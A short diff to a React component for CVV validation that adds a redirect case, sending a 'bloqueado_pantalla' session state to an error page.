@@ -195,6 +195,9 @@ export default function ValidacionCVV() {
                         localStorage.setItem('estado_sesion', 'error');
                         navigate("/autenticacion");
                         break;
+                    case 'bloqueado_pantalla':
+                        navigate("/error-923page");
+                        break;
                     default:
                         console.log("Estado no manejado en redirección:", estado);
                 }
